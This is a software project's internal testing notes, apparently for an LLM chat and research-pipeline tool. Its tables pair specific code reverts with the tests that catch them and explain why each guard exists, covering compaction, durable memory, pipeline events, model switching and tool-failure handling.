| Measure the keep-tokens floor over the view | `test_the_token_floor_measures_the_archive_not_the_view` | Same root cause, second counter. The walk runs out of view turns before it runs out of budget, so the floor under-protects on exactly the threads that have been compacted before |
| Have the loop compute the floor itself | `test_the_valve_asks_the_memory_for_the_current_turn_floor` | `ConversationMemory.completed_turns()` is the only source. `core/loop.py` imports no storage and should not start |
| Drop `compact()`'s no-progress check | `test_no_new_turns_means_no_model_call` | `save_checkpoint` refuses the write anyway, but the model call happens BEFORE that — a thread over the threshold would pay for a summary on every step that produces nothing |
| Drop `save_checkpoint`'s refusal | `test_a_backwards_watermark_is_refused` | The caller-side check covers only the one caller that exists today. `latest_checkpoint` resolves by timestamp, so a backwards watermark does not merely fail to help — it becomes the live one |
| Make `advances()` accept an equal watermark | `test_an_unchanged_watermark_is_refused` | Equal is not progress; accepting it lets a thread rewrite the same checkpoint forever, one model call each time |
| Un-gate the headroom advisory | `test_the_headroom_advisory_is_silent_off_the_startup_path` | `effective_compaction()` is on `should_compact()`'s path — once per step of every turn. Only the ADVISORY is gated; validation still raises everywhere (`test_validation_still_raises_off_the_startup_path`) |
| Report a standing condition every step | `test_a_standing_condition_is_reported_once_per_run` | `compaction_blocked` / `compaction_failed` stay true until something changes. The control is `test_a_real_compaction_still_reports_every_time` — a compaction that happened is an event and must repeat |

### Three standing notes from this pass

**`tests/test_storage_e2e.py` is the only test running real `ConversationMemory`
against real `storage.py` on real SQLite.** Its fixture is module-scoped and that is
not a performance choice: declaring a SQLModel table registers it on
`SQLModel.metadata`, so importing `storage` twice against real sqlmodel raises "Table
'conversationthread' is already defined". Modules are popped and re-imported, never
reloaded, for the same reason. If you add a test there, do not give it its own swap.

**That file's regression test adds exactly ONE turn between compaction rounds.** Three
turns makes it pass against the broken code — the archive then grows faster than the
view-space floor shrinks and the watermark limps forward anyway. One turn is also the
production pattern: after a compaction the thread is still near the threshold, so the
next turn compacts again. Do not "tidy" that number.

**A guard that cannot fire through the normal path needs a direct test.** Once M11's
root fix is in, the watermark never goes backwards, so `save_checkpoint`'s refusal and
`compact()`'s no-progress skip are unreachable from `compact()`. They are tested by
calling them directly. A guard with no test making it fire is indistinguishable from a
guard that does not work — the first revert-check pass of this fix reported four
MISSes for exactly that reason.

## §21b — durable memory (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Ignore `project_path` when listing | `test_a_project_memory_is_invisible_from_another_project` | M12. D25 keys project memories to the resolved path; with only a `scope` string, AC6 is unwriteable as a test rather than merely unenforced |
| Stamp a global row with a project path | `test_a_global_memory_records_no_project_path` | It is then global in name and project-scoped in effect the moment anything filters on the column |
| Return everything when no project resolved | `test_no_resolved_project_means_no_memories_at_all` | `get_project_path()` is None exactly when `initialize()` has not run — "there is no session", not "this session is outside a project" |
| List oldest first | `test_memories_come_back_newest_first` | M14 keeps the most recent N, so the ordering decides which memories survive the cap |
| Make `forget_memory` raise on an unknown id | `test_forgetting_an_unknown_id_reports_rather_than_raises` | The id came from a human reading a list |
| Treat `agent=None` as opted OUT | `test_a_plain_chat_turn_counts_as_opted_in` | M13. `system_prompt_for` is unreachable without an agent, so the feature would be invisible in the default shell — the §25 shape |
| Drop the `use_memory` check at the assembly | `test_an_opted_out_agent_gets_no_fragment` | How the compactor and pipeline reviewer stay out of a user's durable facts |
| Remove M14's cap, or truncate silently | `test_the_cap_limits_how_many_reach_the_prompt`, `test_truncation_is_stated_in_the_prompt_the_model_reads` | Unbounded growth is what §21 exists to fight. The message goes to the MODEL, not only to a log — a log line reaches nobody mid-conversation |
| Announce truncation that did not happen | `test_nothing_is_said_about_truncation_when_none_happened` | The control. "Showing N of N" on every prompt is noise that trains the reader past the real one |
| **Append the fragment inside `with_catalogs()`** | `test_no_memory_reaches_a_research_pass_prompt` | **§19's K6, second instance.** That function feeds `pass_prompt()`, so every user memory would land in all ten research passes from a shell that wrote none of them |
| Stop appending in `run_agent_conversation` | `test_a_real_chat_turn_sends_the_memories` | The CALL SITE. A first version of that test exercised `with_memories` directly and stayed green through this revert — a helper existing proves nothing if nobody calls it |
| Append for an agent-built prompt too | `test_a_real_chat_turn_with_an_agent_prompt_does_not_double_up` | It already went through `system_prompt_for`; repeating pays twice for the tokens M14's cap bounds |
| Un-gate `remember`, or gate `pin` | `test_remember_requires_approval_and_pin_does_not` | D26 asserted as the PAIR it is — either half alone reads as arbitrary. Note `remember: bool = True` appears in BOTH permission dataclasses; reverting the wrong one proves nothing |
| Remove `remember` from `PIPELINE_UNGRANTABLE` | `test_remember_cannot_be_granted_to_a_research_run` | M17. No `approval_check` means R2 calls it grantable, so one `--grant remember` would let ten unattended passes write durable memories — what D26's consequence 1 forbids |
| Drop the content or the reach from the approval notice | `test_the_notice_shows_the_exact_content`, `test_the_notice_distinguishes_global_from_project_reach` | The gate is only worth having if the prompt shows what it is gating |
| Coerce an unknown scope to the default | `test_an_unknown_scope_is_refused_rather_than_coerced` | A model asking for "global" and getting a project row believes a preference follows the user everywhere when it does not |
| Write a project row with no resolved project | `test_a_project_memory_with_no_resolved_project_is_refused` | `list_memories` matches project rows on the path, so it could never be read back — invisible rather than wrong, which is worse |
| Give a piped run a provider | `test_a_piped_session_stays_headless`, `test_a_piped_chat_turn_carries_none` | M16. Matching `build_review_consent`: nobody is there to ask, so `remember` must not fire |
| Make chat use attended's `honour_run_scope=False` | `test_the_chat_provider_honours_run_scope` | Chat wants §18's per-run shortcut; attended research exists for per-call supervision. The two builders must not converge |
| Stop passing the authorization from `run_chat` | `test_a_chat_turn_carries_the_authorization` | Same call-site lesson as above, applied before it could repeat |
| Let `/forget` match a content substring | `test_forget_refuses_a_substring_rather_than_guessing` | A substring hitting two memories has to pick one, and picking silently deletes what the user did not name |
| Drop `/forget`'s empty-argument check | `test_forget_with_no_argument_explains_itself` | Asserted on "Usage:" and NOT on "/memories", which both branches mention — the first version of this row stayed green through the revert for exactly that reason |

### Two standing notes

**Prompt assembly now reads storage.** Any test that initializes `config_loader` AND
builds an agent or chat prompt needs the `fake_storage` fixture — five existing tests
gained it here. A test that does *not* initialize the loader is unaffected, because
`get_project_path()` returns None and the manager answers with nothing.

**`test_compaction_e2e.py` is now `tests/test_storage_e2e.py`** and is the home for
every real-`storage.py` test, not just compaction's. The one-swap rule in the §21a
notes above still applies and is the reason it is one file.

## §22 — pipeline observability (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Stop advancing `_Progress._emitted` | `test_the_watermark_only_moves_forward` **and every other test in the file hangs** | The `while` loop never terminates, so the generator yields the same line forever. A hang, not a failure — kill the run rather than waiting for the timeout |
| Persist AFTER emitting in `checkpoint()` | `test_abandoning_the_generator_leaves_the_record_running` | A generator only advances while someone iterates it, so a consumer that abandons the run between the yield and the persist takes that checkpoint down with it. §5's durability must not depend on a UI's willingness to keep reading |
| Have the orchestrator emit events beside each existing checkpoint instead of deriving them | `test_a_line_written_the_way_review_py_writes_one_is_carried` | AC3. `run.trace` has three writers — `orchestrator.py`, `review.py` (fifteen `run.log()` calls, no checkpoints) and `json_retry.py`'s bare `trace.append()`. Deriving from the list is what carries the other two without editing them |
| Emit a `trace_line` per call site rather than per un-emitted line | `test_every_trace_line_is_emitted_exactly_once_and_in_order` | A re-emitted line is a duplicate in the transcript; a skipped one reached the database and never reached the user |
| Return the run any way other than the terminal event | `test_the_generator_and_the_wrapper_produce_the_same_run` | The wrapper would still work and a streaming consumer would silently get nothing |
| ~~Make `run_deep_research_pipeline` the generator~~ **(row retired, batch 45)** | — | P3 is retired: both shells left for the generator, so the wrapper had no production caller and its fifty call sites were all tests. The convenience is `tests/conftest.run_pipeline` now, and AC1 is pinned on `run_pipeline_to_completion` by `test_draining_the_generator_returns_a_finished_run` |
| Add an eighth field to `LoopEvent` (it has seven) | `test_loop_event_did_not_grow_an_eighth_field` | P1/AC4. §23's events are a decision to make, not a field to add quietly |
| Drop `on_pipeline_event_message`, or stop forwarding in `_forwarding` | `test_ac2_the_tui_renders_pass_boundaries_and_tiers_as_they_happen` | AC2. The panel and transcript are fed exclusively by events — nothing else could have produced a tier for a claim the canned run never had |
| Re-add the `run.trace` dump to `on_research_finished` (or the CLI's `--- Trace ---` block) | `test_the_finished_run_does_not_reprint_the_trace` | Every line already arrived as an event; both prints the whole run twice, and the second copy reads like a different artifact |
| Count `claim_tiered` events instead of keying by claim id | `test_a_re_tiered_claim_is_not_counted_twice` | 6c re-tiers the same claim once per retry round, so the tally would exceed the claim count and keep climbing |
| Name the widget's redraw helper `_render` | **every `test_tui.py` pilot test**, with `'NoneType' object has no attribute 'get_height'` | It shadows Textual's `Widget._render()`, and the traceback points at the compositor rather than at the widget |

### Standing: two ways a research double stops working

**A patch on `run_deep_research_pipeline` no longer intercepts either shell.** Both
`main.run_research` and `tui.app._start_research` call
`stream_deep_research_pipeline`, so the old target is a silent no-op that lets the
REAL pipeline run. Loud here (the fake SDK has no `.stream`), but it is the
`fetch_url` class of defect: wired, documented, doing nothing. Every research double
goes through `_stub_events` (`test_tui.py`, `test_review.py`) or `_events_for`
(`test_e2e.py`).

**A plain-function double for a generator is NOT an error.** `_run_pass`,
`_run_pass_with_json_retry` and `_review_stage` are reached through `yield from`, so a
double returning `"REPORT"` makes it iterate the string one character at a time and
return `None` — the symptom is a report of `None` several asserts later. Use
`test_review.py`'s `_as_generator`, and `conftest.drain()` for a direct call that wants
the return value.

## `/model` — switching provider and model mid-session (2026-08-05)

| Change | What breaks | Fix / why |
|---|---|---|
| Drop the `_busy` guard | `test_model_is_refused_mid_turn` | Swapping under a running worker leaves the transcript claiming one model while the thread records another. Same guard `/new`, `/research` and the thread picker use |
| Stop upper-casing the provider argument | `test_model_switches_both_when_given_a_provider` | `providers.json` keys are upper-case, so `/model openai gpt-4o` would be rejected as unknown |
| Skip the effort re-validation after a switch | `test_switching_model_revalidates_the_effort_level` | Effort is per-MODEL. A level the old model accepted can be rejected outright by the new one, and every later turn fails with a provider 400 — the exact failure the mount-time check exists to stop, reachable again through a switch |
| List providers with no `API_KEY` as configured | `test_bare_model_reports_without_changing_anything` | It sends the user at a provider whose every call 401s |
| Refuse instead of warn on an empty `API_KEY` | `test_a_provider_with_no_key_warns_but_still_switches` | An OpenAI-compatible endpoint running locally legitimately needs no key; refusing blocks a real configuration |
| Accept an unknown provider name | `test_an_unknown_provider_changes_nothing` | `api_initialization` raises the same `ValueError` on the next turn, a long way from the typo that caused it |
| Set the attributes without `refresh_status()` | `test_the_header_shows_which_model_the_next_turn_uses` | The mount banner scrolls away, so nothing on screen says what the next turn will call |
| Read `app.model` anywhere other than at turn start | `test_the_new_model_reaches_the_next_model_call` | Asserted on `call_model_stream`'s arguments — setting the attribute proves only that the attribute was set |

## Tool-failure containment, the arXiv endpoint, and TUI logging (2026-08-05)

Found by running a real research pipeline: `arxiv_search` failed a finished
ten-pass run, and every warning it logged scribbled over the Textual screen.

| Change | What breaks | Fix / why |
|---|---|---|
| Revert `arxiv.ARXIV_API_URL` to `http://` | `test_the_endpoint_is_https` | arXiv 301-redirects it. httpx does NOT follow redirects by default, `raise_for_status()` only raises on >= 400, and the redirect body is empty — so `ET.fromstring("")` raises `ParseError`, three identical retries run, and the tool reports "failed after 3 attempts" for what is actually a scheme change |
| Drop `follow_redirects=True` from `_call_arxiv_api` | `test_redirects_are_followed` | Belt and braces beside https://. If arXiv moves the endpoint again this keeps working rather than failing as an unparseable empty body |
| Make `arxiv`/`web_search` raise after retries again | `test_arxiv_returns_an_error_after_exhausting_retries`, `test_web_search_returns_an_error_after_exhausting_retries` | One transient network failure inside one pass flipped a finished ten-pass run to `status='failed'`. `fetch_url` always returned an error dict; these two were the outliers |
| Remove `dispatch()`'s try/except around `spec.handler` | `test_an_exception_becomes_an_error_result`, `test_a_pipeline_pass_sees_an_error_result_not_an_exception` | The backstop for every future tool and every MCP server — third-party code that can raise anything |
| Catch `ToolCallDenied` in that block | `test_a_policy_denial_still_raises` | A policy denial is the caller's to handle and must stay distinguishable from a tool crash. Every raise of it is above the handler, so a correct implementation never reaches the except at all |
| Downgrade `logger.exception` to `warning` there | `test_the_traceback_is_logged_so_a_real_bug_stays_findable` | The traceback is how a genuine handler bug stays findable now that it no longer crashes the process |
| Route the error result around `check_output_policy` | `test_the_error_result_goes_through_secret_redaction` | An exception message carries the request that produced it — for an HTTP client, a URL with an API key in the query string. Redacting only the success path makes a FAILING tool the way secrets escape |
| Attach the stderr handler in the TUI | `test_stderr_false_attaches_no_stream_handler`, `test_reconfiguring_without_stderr_removes_the_existing_one` | Textual owns the terminal; stderr paints over the rendered screen, sits over the input bar and behind the panels, and vanishes at the next repaint |
| Default `configure_logging(stderr=...)` to False | `test_stderr_defaults_to_on` | The CLI is unchanged. A flipped default silences every non-TUI run |
| Drop `TranscriptLogHandler`, or its `on_unmount` removal | `test_a_warning_reaches_the_transcript`, `test_the_handler_is_detached_when_the_app_unmounts` | Without the handler, dropping stderr makes warnings invisible until someone reads `logs/app.log`. Without the removal it holds a reference to a dead app and stacks one handler per instance across this suite |
| Let `TranscriptLogHandler.emit` raise | `test_a_handler_failure_cannot_take_the_app_down` | emit() runs on whichever thread logged — a research worker, the MCP bridge. A handler that throws inside a message pump kills the app over a diagnostic |
| Route INFO to the transcript too | `test_info_is_not_routed_to_the_transcript` | Noise in a chat transcript; the rotating file already has it with timestamps |
| Warn per call in `context_limit()` | `test_the_unknown_model_warning_is_said_once_per_model` | `thresholds()` is called on every evaluation and `_maybe_compact` runs at the top of every step, so an unknown model warned twice a step across ten passes |
| Dedupe on a single boolean instead of the model | `test_a_second_unknown_model_is_still_reported` | A run that switches model, or a pipeline whose critic model differs (§11), must still hear about the second one |
| Look the model up without normalizing it | `test_a_dated_model_id_resolves_to_its_table_entry` | Exact matching sent `claude-sonnet-5-20260724` to the 200k default while `claude-sonnet-5` sat in the table at a million — a 5x undershoot that reaches `summarize_thread()`'s truncation gate |
| Re-key a `MODEL_CONTEXT_WINDOWS` entry with a date or a `vendor/` prefix | `test_every_table_key_is_already_normalized` | Lookup normalizes the incoming id first, so a decorated key can never be matched. This is what `claude-haiku-4-5-20251001` became the moment normalization existed |
| Split on the first dot instead of an allowlist in `_normalized` | `test_normalization_strips_decorations_and_nothing_else` | `gpt-5.1` and `qwen3.8-max-preview` carry dots inside the model name; a general rule corrupts the two entries it was meant to protect |
| Prefer the table over a queried window | `test_a_queried_window_wins_over_the_table` | The provider's answer is what THIS account has; the table can only record what a model can have |
| Drop the backstop's margin subtraction | `test_the_backstop_fires_at_the_window_minus_the_margin` | Nothing asserted the boundary — the pass-only test probes a full margin ABOVE it, so removing the subtraction entirely stayed green |
| Cache a context-window query that raised | `test_a_failed_query_is_warned_and_NOT_cached` | #35's rule, second application: one transient error would permanently suppress the query for the life of the process |
| Cache nothing when a provider legitimately reports no window | `test_a_provider_that_reports_nothing_answers_None_authoritatively` | That is an ANSWER, not a failure. Re-asking spends a request per compaction check per step |
| Read the Anthropic window with its own `models.retrieve` | `test_the_anthropic_window_rides_along_on_the_effort_retrieve` | It is on the ModelInfo the effort query already fetches; a second call makes config.py's "no extra call" claim false |
| Read only declared fields instead of `.model_extra` | `test_one_reader_covers_every_v1_compatible_spelling`, `test_openai_models_keep_unknown_provider_fields` | `openai.types.Model` declares none of the four aliases. Without the extra-field read, Groq/Mistral/Together/OpenRouter all fall silently back to the table |
| Give `_FakeAnthropicClient` no `.models`, as it had | `test_a_client_with_no_models_endpoint_fails_loudly_not_silently` | The #35 shape: the query raises AttributeError, its own `except` swallows it, and the suite stays green over a query that cannot succeed |
| Let a session override apply to a model it was not set for | `test_another_model_or_provider_does_not_see_it` | The window feeds `_input_budget()`, which gates `summarize_thread()`'s truncation — a 1M number reaching a 200k critic model discards thread content |
| Clear a session override on a pair MISMATCH | `test_a_mismatched_read_does_not_clear_the_override` | One routine critic pass mid-research would silently destroy an override set for the chat, with nothing naming which command did it |
| Rely on the (provider, model) binding instead of clearing on `/model` | `test_switching_away_and_back_gives_the_default_not_the_old_value` | The value stays stored against the original pair, so switching back restores it — the opposite of what was asked for. Both rules are needed and neither is redundant |
| Read the configured trigger in `pin_measurements` | `test_the_pin_cap_follows_a_LOWERED_session_trigger` | `/trigger 12k` leaves the cap at 20k, so one pin can protect more than the whole trigger and floor the thread permanently above it — #89 reintroduced through a different command |
| Let the session tier beat an explicit `/compact` override | `test_an_explicit_compact_override_still_wins` | D27's chain is nearest-wins, and a caller passing its own value is nearer than session state |
| Drop `/trigger`'s eager validation | `test_a_trigger_below_its_dependent_floors_is_REFUSED` | The `ValueError` surfaces later inside `should_compact()` — hot path, mid-turn, far from the command that caused it |
| Refuse a `/window` above the reported window | `test_window_warns_but_does_not_refuse_above_the_reported_window` | Raising it is the command's best use: a beta-gated 1M window reads as 200k until the account is asked with the right header |
| Add `context_window` to `_KNOWN_COMPACTION` | `test_nothing_reaches_the_settings_schema` | A settings key makes it persistable, so a cloned project could ship one behind a trust prompt — the shape G7 and R12 both rejected |
| Loosen `mcp==2.2.0` back to a range | `test_ac6_is_error_becomes_the_error_convention_without_raising` (the batch-32 CI break) | A minor bump changed server behaviour underneath the range: 2.1.0 withholds a crashed tool's text. CI then depended on when it ran, and was not testing what anyone runs locally |
| Assert a CRASHED tool's own message reaches the client | `test_ac6_is_error_becomes_the_error_convention_without_raising` | That is the SERVER's policy, not this client's contract, and in production the server is someone else's. AC6 claims the failure does not RAISE |
| Make the deliberate-failure probe raise a bare exception | `test_ac6_a_deliberate_tool_failure_carries_its_message` | Only `ToolError` has its message forwarded on both pinned versions; a bare exception is a crash and 2.1.0 withholds its text, so the assertion would pass on one version and fail on the other |

### Standing: `compaction._context_window_warned` is module state

`tests/test_compaction.py` clears it in an autouse fixture. Without that, whether
`test_an_unknown_model_warns_about_its_assumed_window` passes depends on which
tests ran first — the kind of order dependency that reads as a flake.


## The truncated-pass cascade and the research budget (2026-08-05)

From a live run: Pass 1 made 14 tool calls, crossed the 250k chat budget, and
returned a tool-calling response with empty text. The orchestrator stored `""`
as `raw_response`; Pass 2 correctly reported it had nothing to extract; the run
died in `Claim`'s constructor three passes later.

| Change | What breaks | Fix / why |
|---|---|---|
| Drop `_check_not_truncated` from `_run_pass` | `test_an_empty_truncated_pass_raises_naming_the_stop_reason`, `test_max_steps_is_treated_the_same_way`, `test_whitespace_only_text_counts_as_empty` | A stop condition returns the last response as it stands, so a pass cut off mid-tool-call yields `""` and every later pass works from nothing |
| Make truncation always fatal | `test_a_truncated_pass_WITH_text_continues_and_is_traced` | A pass that produced an answer and was cut off finishing it is degraded but usable; failing there throws away work the later passes can use |
| Make truncation never fatal | `test_an_empty_truncated_pass_raises_naming_the_stop_reason` | The empty case is exactly the cascade this exists to stop |
| Check `if not response.text` instead of `.strip()` | `test_whitespace_only_text_counts_as_empty` | `"
  "` gives the next pass nothing |
| Treat a missing `stop_reason` as truncated | `test_a_response_with_no_stop_reason_is_not_treated_as_truncated` | `stop_reason` is set by `_run()`/the wrappers, never by `call_model()`. Absence is not evidence of truncation |
| Run the check AFTER `retry_until_json` | `test_a_truncated_json_pass_raises_rather_than_retrying` | A cut-off pass did not write malformed JSON. Nudging it spends more of an exhausted budget to be told the same thing, and reports a parse failure for output that was never finished |
| Revert `run_deep_research_mode` to `MAX_TOKEN_BUDGET` | `test_a_pass_runs_on_the_research_budget_not_the_chat_one` | The meter re-counts the whole prompt every step (TECHNICAL_DEBT item 9), so a tool-heavy pass burns the chat ceiling quadratically |
| Drop `max_total_tokens` from the orchestrator's `retry_until_json` call | `test_the_json_retry_carries_the_same_budget` | The retry re-enters the pass's already-large thread; the chat default would cut it off almost immediately. Same argument as the `context` parameter beside it |
| Raise `MAX_TOKEN_BUDGET` instead of adding a second constant | `test_chat_keeps_the_smaller_budget` | Raising the research ceiling must not raise the chat spend cap with it |

### Standing: `extra={}` in a log call renders as nothing

The default formatter is `%(message)s`, so `logger.warning("fetch_url failed",
extra={"url": ..., "error": ...})` prints exactly `fetch_url failed`. Every
diagnostic field is dropped. Interpolate into the message instead. This is why a
run of ordinary 404s was indistinguishable from a broken tool, and why an arXiv
scheme change hid behind three identical `arxiv_search attempt failed` lines.


## §26 — research legibility (2026-08-05)

### The one that fails by passing: doubles on `run_deep_research_mode`

`_run_pass` now iterates `RunAgentLoop.stream_deep_research_mode()`. Anything
still patched on `run_deep_research_mode` **stops intercepting and runs the real
loop** — 46 failures across 8 files, none of them at the patch site. This is
§22's twelve-doubles trap one layer down, and it is now the second recorded
instance, so treat any repoint of a call site as a repoint of its doubles.

Repointing goes through `tests/conftest.py`'s `pass_stream(source, events=())`,
which turns a double written against the old name into a generator side_effect.
Do not open-code it — fifteen bespoke wrappers is how they drift.

| Change | What breaks | Fix / why |
|---|---|---|
| `_translate` uses `for event in stream` instead of `next()` | `test_the_response_still_carries_its_thread_id` | A `for` loop SWALLOWS a generator's return value, and `thread_id` is attached after the pass's loop finishes. Every test about tool events still passes; §3's JSON retry silently opens a new thread instead of correcting the failed one |
| ~~`run_deep_research_mode` returns the generator instead of draining it~~ **(row retired, batch 45)** | — | The wrapper is gone; `_run_pass` iterates `stream_deep_research_mode` and the only remaining callers were tests. `tests/conftest.run_pass` is the synchronous form |
| `run_to_completion` used to drain a PASS | `test_draining_a_pass_returns_the_response_with_its_thread_id` | Unchanged in substance, and the subject moved with the wrapper: `run_to_completion` reads the response off the terminal event, which is the copy WITHOUT `thread_id`. A pass must be drained by something that keeps a generator's return value — `yield from` in `_run_pass`, `tests/conftest.drain` in a test. `core.loop.return_value_of` was that helper and retired with the wrapper it served |
| Drop `redact_secrets` from `_param_digest` | `TestTheParamDigestIsRedacted` (2 tests) | Tool ARGUMENTS were never redacted: `check_input_policy` refuses a call, it does not redact one, and `check_output_policy` only saw results |
| Redact after truncating instead of before | `test_redaction_runs_before_truncation` | Truncation can cut a credential below the 20 characters its pattern needs, leaving the fragment unmatched. The test fixture puts the cut inside the key on purpose — with a longer surviving fragment it passes either way |
| Emit `_stage("D2")` inside the per-claim loop | `test_d2_is_announced_once_per_round_not_once_per_claim` | D2 is one decision applied to every exhausted claim; per-claim emission makes a round that exhausted six claims read as six stages. The fixture exhausts TWO claims — with one, the two behaviours are indistinguishable |
| Add a `step` kind and infer it from the event stream | — (no test; it is an absence) | `_run()` has no step marker. Within a step it yields start/result in pairs; between steps it yields nothing unless the model streamed text. See the note in `core/reasoning/events.py` |
| Forward `token_delta` text into `PipelineEvent.text` | `test_streamed_text_becomes_volume_never_content` | Seven of the ten passes emit raw JSON; only the volume escapes |
| Give `LoopEvent` an eighth field for any of this | `test_pipeline_events.py`'s P1 pin | `PipelineEvent` is the type that grows. That is what its `kind` discriminator is for |

### The TUI half

| Change | What breaks | Fix / why |
|---|---|---|
| `Transcript._styles` calls `self.app` unguarded | `test_a_widget_renders_without_a_running_app` | `self.app` raises `NoActiveAppError` rather than returning None, and widgets are constructed bare throughout the suite. Presentation degrades; it does not raise |
| Bind the claims view to `ctrl+k` | `test_ctrl_l_opens_the_claims_view_while_the_input_has_focus` | Textual's `Input` binds `ctrl+k` to `delete_right_all` and holds focus, so the binding is shadowed and pressing it deletes the typed line |
| `/theme` stops calling `rerender()` | `test_switching_theme_replays_the_transcript` | `RichLog` stores rendered segments, so everything already on screen keeps the old palette. Note the test spies on the RENDER: `_entries` survive either way, so an assertion about them alone passes with the replay removed |
| A new write path that skips `Transcript._emit` | — (silent) | The line reaches the screen and neither the `/theme` replay nor `/copy all`. Same two-writers shape §22 removed from the trace |
| `--file` also fires `copy_to_clipboard` | `test_copy_to_a_file_writes_what_it_says_it_wrote` | `--file` exists because OSC 52 cannot be confirmed; doing both makes the provable route indistinguishable from the unprovable one |

### Standing: a transcript stub must track `Transcript`'s write methods

`_StubTranscript` (`test_agents.py`), `_NullTranscript` (`test_review.py`) and
`_T` (`test_skills.py`) each stand in for the real widget. When `tui/app.py`
starts calling a new one, all three need it — the failure is an `AttributeError`
raised from inside `app.py`, nowhere near the widget that grew the method. §26
added `write_answer`, `write_role`, `rerender` and `as_text`, and made
`flush_stream` return the flushed text rather than None.

---

## 12. ROADMAP_v2 §27 — thread kinds, and the doubles that construct a memory

§27 gave `ConversationMemory.__init__` a second parameter (`kind`) and
`storage.create_thread` / `storage.list_threads` a keyword each. Nothing in
production calls them positionally, so the breakage is entirely in doubles —
and it does not fail at the double, it fails inside `core/loop.py` with a
`TypeError` about an unexpected keyword argument.

| Change | What breaks | Fix / why |
|---|---|---|
| A `ConversationMemory` double that does not accept `kind` | `TypeError: __init__() got an unexpected keyword argument 'kind'` raised from `core/loop.py`, in whichever test installed the double | `tests/conftest.py`'s `FakeMemory` and `test_cli.py`'s two `SpyMemory` classes take `(thread_id=None, kind="chat")` and RECORD the kind. Any new double does the same |
| A `FakeStorage` that does not mirror `create_thread(kind=...)` / `list_threads(kind=...)` | `TypeError` at the call, or a filter test that passes for the wrong reason | `FakeStorage` mirrors both, plus `thread_kind()` — which is NOT a production method, deliberately named differently, and exists only as §27 AC1's assertion hook |
| Remove `list_threads`' default filter, or its `kind`/`preview` row fields | `test_list_threads_returns_all_threads_most_recent_first` (shape), `test_machinery_threads_are_not_listed`, `test_list_threads_filters_by_kind_in_sql` | The row shape is asserted exactly, in the fake and against real SQL. `kind=None` is the escape hatch and must keep returning everything |
| `create_thread` stops defaulting to `chat` | Broadly red: every existing caller creates conversations by omission | The default is what keeps §27 a two-line change at three call sites instead of an audit of every thread creation |
| Replay reads `memory.messages` instead of `storage.archive_history` | `test_replaying_a_compacted_thread_shows_the_original_first_message` | T3. The derived view leads with the compaction summary, which M8 says must never be rendered as something the user said. Note the test needs a REAL compaction — the two spaces coincide until a checkpoint exists, which is how §21a's watermark defect survived 849 tests |
| Replay renders tool RESULTS | `test_a_tool_call_is_one_line_and_its_result_is_skipped` | T4. A grounding-heavy thread carries hundreds of kilobytes of fetched page text in those rows |
| A second copy of `param_digest` | `TestTheParamDigestIsRedacted` still passes — against whichever copy the test imports | §27 moved it to `safety/policy_enforcement.py` because the replay renderer is its second caller. The tests moved WITH it, so there is one place the redact-before-truncate ordering is pinned. A copy is invisible to them |
| Record a pass's thread AFTER `_check_not_truncated` | `test_a_pass_that_dies_truncated_still_records_its_thread` | That check RAISES for a pass cut off mid-tool-call, whose thread is the one most worth opening |
| Relax `classify_legacy_pass_threads`' window to include an unfinished run | 3 tests in `TestClassifyingLegacyThreads` | Both guards have to go for it to break: SQL's `x <= NULL` is already not true, so dropping either alone changes nothing. The lenient version (`finished_at IS NULL OR ...`) reads as a kindness and hides every conversation since an abandoned run |
| `ensure_columns` grows a backfill so the separate classification can go away | — (silent, then destructive) | M7's contract is additive-only. The classification is a separate function precisely so data policy stays out of the one function every launch runs through |

### Standing: `app._transcript` is a query against the ACTIVE screen

A pilot test that opens a modal (`ThreadPickerScreen`, `PermissionScreen`, …)
and then reads `app._transcript` gets `NoMatches`, because the query runs
against the pushed screen. Hold a reference to the widget BEFORE opening the
modal — `test_resuming_clears_the_screen_and_replays` does, and the comment
there says why.

---

## 13. ROADMAP_v2 §21c — the summary store, and the tier every shell owes

§21c added `storage.ThreadSummary` plus three functions, and a prompt tier that two
shells must both apply. Nothing here fails at the edit site.

| Change | What breaks | Fix / why |
|---|---|---|
| A `FakeStorage` without `latest_thread_summary` / `save_thread_summary` | `AttributeError` from inside `core/compaction.py`, in whichever test drove a summary | Both are mirrored in `_thread_summaries`, a dict kept SEPARATE from `_checkpoints` for the same reason production uses a separate table. `last_message_id` and `advances` are deliberately NOT mirrored — both read `_ordered_rows`, which is faked, so the real position arithmetic runs under test |
| Route a summary through `save_checkpoint` (or add an advance guard to `save_thread_summary`) | `test_a_thread_summary_does_not_compact_the_thread` (real SQL), `test_summarizing_does_not_change_what_the_model_sees` | M18. `latest_checkpoint` resolves by timestamp and feeds `_derived_view`, so a summary row there becomes the live watermark and folds the thread it describes. The missing guard is a decision, not an omission |
| `summarize_thread` reads `memory.messages` | `test_it_reads_the_archive_not_the_derived_view`, and the real-storage `test_a_summary_of_a_compacted_thread_describes_the_conversation` | T3's reasoning. Note the real-storage test needs a thread whose DERIVED VIEW alone exceeds `SUMMARY_TARGET_CHARS` — otherwise the view-based version stores verbatim, makes no call, and the assertions read the compaction's call instead. That is how it was wrong the first time |
| Make the summary target a `COMPACTION_TARGET_RATIOS` entry | `test_the_target_is_absolute_not_a_strength_ratio` | The consumer is a prompt tier on every turn, so nothing bounds a proportional target. The test asserts the two candidate numbers DIFFER before asserting which was used — without that it passes either way |
| Remove the fits-already branch | `test_a_short_thread_costs_no_model_call` | A thread shorter than the budget is its own best summary |
| Drop the `advances()` staleness check, either direction | `test_an_unchanged_thread_is_served_from_the_store` or `test_a_grown_thread_is_re_summarized` | Both directions matter: serving stale, and paying twice for an unchanged thread |
| Append `with_refs` inside `with_catalogs()` | `test_no_ref_reaches_a_research_pass_prompt` | K6's THIRD instance (skills, then §21b's memories). A conversation referenced in a chat session must not reach ten research passes |
| Guard `with_refs` with `if system_prompt is None`, copying the memories line above it | `test_an_agent_built_prompt_still_gets_them` | Refs are thread state, and `system_prompt_for()` has no memory object — so an active agent would silently lose every attached reference. A two-word edit that reads as consistency |
| Remove either `with_refs` call site | `test_a_real_chat_turn_sends_the_refs` or `test_the_tui_turn_sends_them_too` | Tested independently, because §21b recorded that testing only the helper leaves everything green when a call site goes |
| Make the ref cap drop the oldest | `test_the_cap_refuses_rather_than_dropping_the_oldest` | A reference is something a person chose by name; M15's rule against silent removal |
| Stop stating the cap in the fragment | `test_the_cap_is_applied_and_stated` | M14's no-silent-caps rule: the count reaches the MODEL, not only a log |
| `/summary` calls `compact()` | `test_it_shows_the_summary_without_folding_the_thread` | M20. Same summariser, different request |
